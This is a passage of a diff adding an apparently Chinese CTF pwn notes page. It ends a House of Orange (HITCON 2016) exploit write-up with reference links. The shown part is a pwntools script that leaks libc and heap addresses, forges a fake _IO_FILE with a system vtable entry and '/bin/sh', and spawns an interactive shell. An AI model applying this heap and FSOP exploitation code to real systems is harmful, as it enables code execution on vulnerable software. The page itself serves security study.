+<span class="c1">#0x555555758000     0x555555779000 rw-p    21000 0      [heap]</span>
+<span class="c1">#0x555555758000     0x55555579b000 rw-p    43000 0      [heap]</span>
+
+<span class="c1"># step2 leak libc</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x450</span><span class="p">,</span><span class="s1">&#39;c&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span><span class="mh">0xddaa</span><span class="p">,</span><span class="mh">0xddaa</span><span class="p">)</span>
+<span class="n">show</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;c&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">leak_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;leak_addr:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">))</span>
+<span class="n">libc_addr</span> <span class="o">=</span> <span class="n">leak_addr</span><span class="o">-</span><span class="mi">1640</span><span class="o">-</span><span class="mh">0x3c4b20</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;libc_addr:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_addr</span><span class="p">))</span>
+<span class="n">IO_list_all</span><span class="o">=</span><span class="n">libc_addr</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_list_all&#39;</span><span class="p">]</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;IO_list_all:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">IO_list_all</span><span class="p">))</span>
+<span class="n">system</span><span class="o">=</span><span class="n">libc_addr</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+
+<span class="c1"># step3 leak heap</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;d&#39;</span> <span class="o">*</span> <span class="mh">0x10</span>
+<span class="n">edit</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span><span class="mh">0xddaa</span><span class="p">,</span><span class="mh">0xddaa</span><span class="p">)</span>
+<span class="n">show</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;d&#39;</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">heap_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;heap_addr:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">))</span>
+
+<span class="c1"># set fake struct</span>
+<span class="n">payload</span><span class="o">=</span><span class="s1">&#39;d&#39;</span><span class="o">*</span><span class="mh">0x450</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000ddaa00000003</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">fake</span> <span class="o">=</span> <span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span>
+<span class="n">fake</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">IO_list_all</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">fake</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">fake</span> <span class="o">=</span> <span class="n">fake</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xc0</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">fake</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
+<span class="n">fake</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_addr</span><span class="o">+</span><span class="mh">0x558</span><span class="p">)</span> <span class="c1">#vtable</span>
+<span class="n">fake</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>
+<span class="n">fake</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">fake</span>
+<span class="n">edit</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span><span class="n">payload</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span>
+
+<span class="c1">#gdb.attach(p)</span>
+
+<span class="c1"># unlink attack</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Your choice : &quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h4 id="_21">参考文章<a class="headerlink" href="#_21" title="Permanent link">&para;</a></h4>
+<ul>
+<li><a href="https://www.cnblogs.com/shangye/p/6268981.html">ctf-HITCON-2016-houseoforange学习</a></li>
+<li><a href="https://blog.csdn.net/weixin_44145820/article/details/105270036">houseoforange_hitcon_2016（House of orange， unsorted bin attack，FSOP）</a></li>
+<li><a href="https://www.jianshu.com/p/1e45b785efc1">house_of_orange</a></li>
+</ul>
+<h2 id="_22">参考文章<a class="headerlink" href="#_22" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="https://blog.csdn.net/Mira_Hu/article/details/103736917">IO_FILE:2018 HCTF the_end</a></li>
+<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/4.13_io_file.html">4.13 利用 _IO_FILE 结构</a></li>
+<li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file">IO_FILE Related</a></li>
+<li><a href="https://xz.aliyun.com/t/6567">IO file结构在pwn中的妙用</a></li>
+<li><a href="https://bestwing.me/IO_FILE_Pwn.html">IO_FILE Pwn 利用整理</a></li>
+</ul>
+<hr />
+<div class="footnote">
+<hr />
+<ol>
+<li id="fn:1">
+<p>用 fwrite 等这种流 I/O 函数写入写出，数据会先放在缓冲区，并没有真正输入或者输出，需要用 fflush 冲洗流中信息才完成写入写出。避免用 fflush 冲洗就用 setbuf 函数关闭缓冲（pwn 题初始化必备）&#160;<a class="footnote-backref" href="#fnref:1" title="Jump back to footnote 1 in the text">&#8617;</a></p>
+</li>
+</ol>
+</div>
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
+        
+          <a href="../glibc2.24%E4%B8%8BIO_FILE%E7%9A%84%E5%88%A9%E7%94%A8/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+            </div>
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  上一页
+                </span>
+                libc2.24下IO_FILE的利用
+              </div>
+            </div>
+          </a>
+        
+        
+          <a href="../../glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  下一页
+                </span>
+                堆基础知识
+              </div>
+            </div>
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            <span>&copy; 2021</span>by <a href="https://www.mrskye.cn/" target="_blank">SkYe231</a> &nbsp;|&nbsp; <span><a href="http://beian.miit.gov.cn/" target="_blank">粤ICP备20056619号</a></span>
+          </div>
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../../assets/javascripts/vendor.93c04032.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.83e5331e.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
+      
+      <script>
+        app = initialize({
+          base: "../../..",
+          features: ['tabs', 'instant'],
+          search: Object.assign({
+            worker: "../../../assets/javascripts/worker/search.8c7e0a7e.min.js"
+          }, typeof search !== "undefined" && search)
+        })
+      </script>
+      
+    
+  </body>
+</html>
